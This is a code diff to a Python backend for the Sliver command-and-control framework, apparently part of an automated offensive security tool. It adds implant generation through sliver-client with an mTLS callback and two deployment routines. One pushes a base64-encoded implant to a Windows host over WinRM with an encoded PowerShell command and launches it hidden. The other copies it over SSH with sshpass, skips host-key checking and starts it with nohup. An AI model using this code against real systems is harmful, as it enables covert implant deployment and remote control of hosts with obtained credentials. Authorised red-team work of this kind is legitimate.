@@ -1,4 +1,7 @@
+import asyncio
 import os
+import subprocess
+import tempfile
 import time
 from typing import Optional
 
@@ -21,14 +24,22 @@ class SliverBackend:
             return
         try:
             from sliver import SliverClient
-            if self._config_path and os.path.exists(self._config_path):
-                cfg = open(self._config_path).read()
+            from sliver.config import SliverClientConfig
+            config_path = self._config_path if (self._config_path and os.path.exists(self._config_path)) else None
+            config_b64 = os.getenv("SLIVER_OPERATOR_CONFIG_B64", "")
+            if config_path:
+                config = SliverClientConfig.parse_config_file(config_path)
+            elif config_b64:
+                import base64, json
+                cfg_data = base64.b64decode(config_b64).decode()
+                config = SliverClientConfig.from_json(cfg_data)
             else:
-                cfg = os.getenv("SLIVER_OPERATOR_CONFIG_B64", "")
-            self._client = await SliverClient.from_config(cfg)
-            await self._client._connect()
+                self._available = False
+                return
+            self._client = SliverClient(config)
+            await self._client.connect()
             self._available = True
-        except Exception:
+        except Exception as e:
             self._client = None
             self._available = False
 
@@ -56,28 +67,63 @@ class SliverBackend:
             self._available = False
             return []
 
-    async def generate_implant(self, config: ImplantConfig) -> bytes:
-        await self._ensure_client()
-        if not self._available:
-            return b""
+    async def _import_config(self):
         try:
-          from sliver.sliver_pb2 import GenerateReq, ImplantConfig as SliverImplantConfig
-          req = GenerateReq(
-              Config=SliverImplantConfig(
-                  IsSharedLib=False,
-                  IsService=False,
-                  OS=config.os,
-                  Arch=config.arch,
-                  Format=config.format,
-                  Name=config.name,
-                  LimitDomain=config.limit_domain or "",
-                  LimitHostname=config.limit_hostname or "",
-              )
-          )
-          resp = await self._client._stub.Generate(req)
-          return resp.File
+            proc = await asyncio.create_subprocess_exec(
+                "/usr/local/bin/sliver-client", "import", "/sliver-config/operator.cfg",
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            )
+            await proc.wait()
         except Exception:
-            return b""
+            pass
+
+    async def generate_implant(self, config: ImplantConfig) -> bytes:
+        await self._import_config()
+        safe_name = config.name.replace(" ", "_").replace("/", "_")
+        out_path = f"/sliver-config/{safe_name}"
+        listener_port = os.getenv("SLIVER_LISTENER_PORT", "31338")
+        cmds = (
+            f"generate --mtls sliver-server:{listener_port} "
+            f"--os {config.os} --arch {config.arch} "
+            f"--name {safe_name} --format {config.format} "
+            f"--save {out_path}\n"
+            f"exit\n"
+        )
+        try:
+            with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
+                f.write(cmds)
+                script_path = f.name
+            env = os.environ.copy()
+            env["HOME"] = "/tmp"
+            proc = await asyncio.create_subprocess_exec(
+                "/usr/local/bin/sliver-client", "--rc", script_path,
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                env=env,
+            )
+            try:
+                await asyncio.wait_for(proc.wait(), timeout=360)
+            except asyncio.TimeoutError:
+                try:
+                    proc.kill()
+                except Exception:
+                    pass
+                return b""
+            finally:
+                try:
+                    os.unlink(script_path)
+                except Exception:
+                    pass
+            if os.path.exists(out_path):
+                with open(out_path, "rb") as f:
+                    data = f.read()
+                try:
+                    os.unlink(out_path)
+                except Exception:
+                    pass
+                return data
+        except Exception:
+            pass
+        return b""
 
     async def send_task(self, session_id: str, command: str) -> TaskResult:
         await self._ensure_client()
@@ -115,9 +161,63 @@ class SliverBackend:
         except Exception:
             pass
 
+    async def deploy_implant_winrm(self, target: str, username: str, password: str,
+                                     transport: str = "mtls", os_type: str = "windows") -> Optional[str]:
+        cfg = ImplantConfig(os=os_type, arch="amd64", name=f"implant-{target.replace('.','-')}",
+                            format="exe", transport=transport)
+        implant_bytes = await self.generate_implant(cfg)
+        if not implant_bytes:
+            return None
+
+        try:
+            import base64, uuid
+            b64 = base64.b64encode(implant_bytes).decode()
+            remote_path = f"C:\\Windows\\Tasks\\{uuid.uuid4().hex[:8]}.exe"
+            ps_cmd = (
+                f"$b = [Convert]::FromBase64String('{b64}'); "
+                f"[IO.File]::WriteAllBytes('{remote_path}', $b); "
+                f"Start-Process -WindowStyle Hidden '{remote_path}'"
+            )
+            from ..kali_tools_client import kali
+            result = await kali.run("netexec", (
+                f"winrm {target} "
+                f"-u '{username}' -p '{password}' "
+                f"-X 'powershell -EncodedCommand {base64.b64encode(ps_cmd.encode()).decode()}'"
+            ), timeout=120)
+            if "error" not in result:
+                return remote_path
+        except Exception:
+            pass
+        return None
+
+    async def deploy_implant_ssh(self, target: str, username: str, password_or_key: str,
+                                  transport: str = "mtls", os_type: str = "linux") -> Optional[str]:
+        cfg = ImplantConfig(os=os_type, arch="amd64", name=f"implant-{target.replace('.','-')}",
+                            format="exe", transport=transport)
+        implant_bytes = await self.generate_implant(cfg)
+        if not implant_bytes:
+            return None
+
+        try:
+            import base64, uuid
+            b64 = base64.b64encode(implant_bytes).decode()
+            remote_path = f"/tmp/{uuid.uuid4().hex[:8]}"
+            from ..kali_tools_client import kali
+            deploy_cmd = (
+                f"sshpass -p '{password_or_key}' ssh -o StrictHostKeyChecking=no "
+                f"{username}@{target} "
+                f"'base64 -d > {remote_path} <<< {b64} && chmod +x {remote_path} && nohup {remote_path} >/dev/null 2>&1 &'"
+            )
+            result = await kali.run("bash", f"-c '{deploy_cmd}'", timeout=120)
+            if "error" not in result:
+                return remote_path
+        except Exception:
+            pass
+        return None
+
     async def stop(self):
         if self._client:
             try:
-                await self._client.disconnect()
+                await self._client._channel.close()
             except Exception:
                 pass
